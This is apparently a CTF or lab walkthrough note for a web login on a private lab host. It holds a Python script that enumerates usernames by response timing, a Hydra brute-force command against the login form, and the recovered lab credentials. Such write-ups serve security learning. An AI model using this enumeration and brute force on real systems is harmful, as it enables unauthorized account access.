## I. Interface:

![[Pasted image 20220410084919.png]]

## II. Login attempts:
### 1. Login with non-existent account
![[Pasted image 20220410085605.png]]

### 2. Login into legit account with incorrect password
![[Pasted image 20220410085701.png]]

### => Timing attack?

## III. Timing attack trial - User enumeration
Script used:
```python
#!/usr/bin/env python3
import requests
import json

host = "http://10.10.14.145"
endpoint = host + "/api/user/login"

def main():
    time = {}
    with open('usernames.txt', 'r') as userlist:
        for username in userlist:
            username = username.replace("\n", "")
            print(f"Testing username: {username}", end='\r')
            form = {
                    "username": username,
                    "password": "lolincorrect",
                }
            response = requests.post(url=endpoint, data=form)
            time[username] = response.elapsed.total_seconds()
    time = dict(sorted(time.items(), key = lambda d: d[1], reverse=True))
    print(json.dumps(time, indent=4))

if __name__ == '__main__':
    main()

```

Result: `James` account has an abnormal slow respond time.

=> `James` is a valid user

## IV. Hydra custom password list bruteforce
Command used:
```bash
hydra -l james -P custom_wordlist.txt 10.10.14.145 http-post-form "/api/user/login:username=^USER^&password=^PASS^:Invalid Username Or Password"
```

Crendentials acquired:

username | password
-------- | --------
james | blue7

Logged in as `james` user:

![[Pasted image 20220410103009.png]]

[[Port 22]]


